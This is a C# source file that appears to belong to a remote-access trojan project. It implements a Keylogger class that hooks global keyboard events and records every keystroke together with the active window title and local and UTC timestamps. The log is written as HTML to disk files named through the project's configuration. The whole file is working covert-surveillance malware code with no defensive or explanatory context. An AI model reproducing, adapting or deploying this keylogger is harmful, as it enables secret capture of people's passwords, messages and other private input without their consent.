using Q3C273.Shared.Cryptography;
using Q3C273.Shared.Helpers;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Text;
using System.Web;
using System.Windows.Forms;
using Ton618.Config;
using Ton618.Extensions;
using Ton618.Helper;
using Ton618.MouseKeyHook;
using Ton618.Utilities;
using Timer = System.Timers.Timer;

namespace Ton618.Logging
{
    /// <summary>
    /// This class provides keylogging functionality and modifies/highlights the output for
    /// better user experience.
    /// </summary>
    public class Keylogger : LoggerBase
    {
        /// <summary>
        /// Temporary list of pressed keys while they are being processed.
        /// </summary>
        private readonly List<Keys> pressedKeys = new List<Keys>();

        /// <summary>
        /// Temporary list of pressed keys chars while they are being processed.
        /// </summary>
        private readonly List<char> pressedKeyChars = new List<char>();

        /// <summary>
        /// Saves the last window title of an application.
        /// </summary>
        private string lastWindowTitle = string.Empty;

        /// <summary>
        /// Determines if special keys should be ignored for processing, e.g. when a modifier key is pressed.
        /// </summary>
        private bool ignoreSpecialKeys;

        /// <summary>
        /// Used to hook global mouse and keyboard events.
        /// </summary>
        private readonly IKeyboardMouseEvents globalEvents;

        /// <summary>
        /// Initializes a new instance of <see cref="Keylogger"/> that provides keylogging functionality.
        /// </summary>
        /// <param name="flushInterval">The interval to flush the buffer from memory to disk.</param>
        /// <param name="maxLogFileSize">The maximum size of a single log file.</param>
        public Keylogger(double flushInterval, long maxLogFileSize) : base("Keyboard", flushInterval, maxLogFileSize)
        {
            globalEvents = Hook.GlobalEvents();
        }

        /// <summary>
        /// Begins logging of keys.
        /// </summary>
        protected override void OnStart()
        {
            globalEvents.KeyDown += OnKeyDown;
            globalEvents.KeyUp += OnKeyUp;
            globalEvents.KeyPress += OnKeyPress;
        }

        protected override void OnDispose()
        {
            globalEvents.KeyDown -= OnKeyDown;
            globalEvents.KeyUp -= OnKeyUp;
            globalEvents.KeyPress -= OnKeyPress;
            globalEvents.Dispose();
        }

        /// <summary>
        /// Initial handling of the key down events and updates the window title.
        /// </summary>
        /// <param name="sender">The sender of  the event.</param>
        /// <param name="e">The key event args, e.g. the keycode.</param>
        /// <remarks>This event handler is called first.</remarks>
        private void OnKeyDown(object sender, KeyEventArgs e)
        {
            var activeWindowTitle = NativeMethodsHelper.GetForegroundWindowTitle();
            if (!string.IsNullOrEmpty(activeWindowTitle) && activeWindowTitle != lastWindowTitle)
            {
                lastWindowTitle = activeWindowTitle;
                LogBuffer
                    .Append(@"<p class=""h""><br><br>[<b>")
                    .Append(HttpUtility.HtmlEncode(activeWindowTitle))
                    .Append(" - Local=")
                    .Append(DateTime.Now.ToString("t", DateTimeFormatInfo.InvariantInfo))
                    .Append(" UTC=")
                    .Append(DateTime.UtcNow.ToString("t", DateTimeFormatInfo.InvariantInfo))
                    .Append("</b>]</p><br>");
            }

            if (pressedKeys.ContainsModifierKeys())
            {
                if (!pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    pressedKeys.Add(e.KeyCode);
                    return;
                }
            }

            if (!e.KeyCode.IsExcludedKey())
            {
                // The key was not part of the keys that we wish to filter, so
                // be sure to prevent a situation where multiple keys are pressed.
                if (!pressedKeys.Contains(e.KeyCode))
                {
                    Debug.WriteLine("OnKeyDown: " + e.KeyCode);
                    pressedKeys.Add(e.KeyCode);
                }
            }
        }

        /// <summary>
        /// Processes pressed keys and appends them to the <see cref="logBuffer"/>. Processing of Unicode characters starts here.
        /// </summary>
        /// <param name="sender">The sender of  the event.</param>
        /// <param name="e">The key press event args, especially the pressed KeyChar.</param>
        /// <remarks>This event handler is called second.</remarks>
        private void OnKeyPress(object sender, KeyPressEventArgs e)
        {
            if (pressedKeys.ContainsModifierKeys() && pressedKeys.ContainsKeyChar(e.KeyChar))
                return;

            if ((!pressedKeyChars.Contains(e.KeyChar) || !DetectKeyHolding(pressedKeyChars, e.KeyChar)) && !pressedKeys.ContainsKeyChar(e.KeyChar))
            {
                var filtered = HttpUtility.HtmlEncode(e.KeyChar.ToString());
                if (!string.IsNullOrEmpty(filtered))
                {
                    Debug.WriteLine("OnKeyPress Output: " + filtered);
                    if (pressedKeys.ContainsModifierKeys())
                        ignoreSpecialKeys = true;

                    pressedKeyChars.Add(e.KeyChar);
                    LogBuffer.Append(filtered);
                }
            }
        }

        /// <summary>
        /// Finishes processing of the keys.
        /// </summary>
        /// <param name="sender">The sender of  the event.</param>
        /// <param name="e">The key event args.</param>
        /// <remarks>This event handler is called third.</remarks>
        private void OnKeyUp(object sender, KeyEventArgs e)
        {
            LogBuffer.Append(HighlightSpecialKeys(pressedKeys.ToArray()));
            pressedKeyChars.Clear();
        }

        /// <summary>
        /// Finds a held down key char in a given key char list.
        /// </summary>
        /// <param name="list">The list of key chars.</param>
        /// <param name="search">The key char to search for.</param>
        /// <returns><c>True</c> if the list contains the key char, else <c>false</c>.</returns>
        private bool DetectKeyHolding(List<char> list, char search)
        {
            return list.FindAll(s => s.Equals(search)).Count > 1;
        }

        /// <summary>
        /// Adds special highlighting in HTML to the special keys.
        /// </summary>
        /// <param name="keys">The input keys.</param>
        /// <returns>The highlighted special keys.</returns>
        private string HighlightSpecialKeys(Keys[] keys)
        {
            if (keys.Length < 1)
                return string.Empty;

            var names = new string[keys.Length];
            for (var i = 0; i < keys.Length; i++)
            {
                if (!ignoreSpecialKeys)
                {
                    names[i] = keys[i].GetDisplayName();
                    Debug.WriteLine("HighlightSpecialKeys: " + keys[i] + " : " + names[i]);
                }
                else
                {
                    names[i] = string.Empty;
                    pressedKeys.Remove(keys[i]);
                }
            }

            ignoreSpecialKeys = false;

            if (pressedKeys.ContainsModifierKeys())
            {
                var specialKeys = new StringBuilder();

                var validSpecialKeys = 0;
                for (var i = 0; i < names.Length; i++)
                {
                    pressedKeys.Remove(keys[i]);
                    if (string.IsNullOrEmpty(names[i]))
                        continue;

                    specialKeys.AppendFormat(validSpecialKeys == 0 ? @"<p class=""h"">[{0}" : " + {0}", names[i]);
                    validSpecialKeys++;
                }

                // If there are items in the special keys string builder, give it an ending tag
                if (validSpecialKeys > 0)
                    specialKeys.Append("]</p>");

                Debug.WriteLineIf(specialKeys.Length > 0, "HighlightSpecialKeys Output: " + specialKeys.ToString());
                return specialKeys.ToString();
            }

            var normalKeys = new StringBuilder();

            for (var i = 0; i < names.Length; i++)
            {
                pressedKeys.Remove(keys[i]);
                if (string.IsNullOrEmpty(names[i]))
                    continue;

                switch (names[i])
                {
                    case "Return":
                        normalKeys.Append(@"<p class=""h"">[Enter]</p><br>");
                        break;
                    case "Escape":
                        normalKeys.Append(@"<p class=""h"">[Esc]</p>");
                        break;
                    default:
                        normalKeys.Append(@"<p class=""h"">[").Append(names[i]).Append("]</p>");
                        break;
                }
            }

            Debug.WriteLineIf(normalKeys.Length > 0, "HighlightSpecialKeys Output: " + normalKeys.ToString());
            return normalKeys.ToString();
        }

        protected override string LogFileNameSupplier(int fileIndex) => Settings.GetKeyLogFileNameFormat(fileIndex);
    }
}
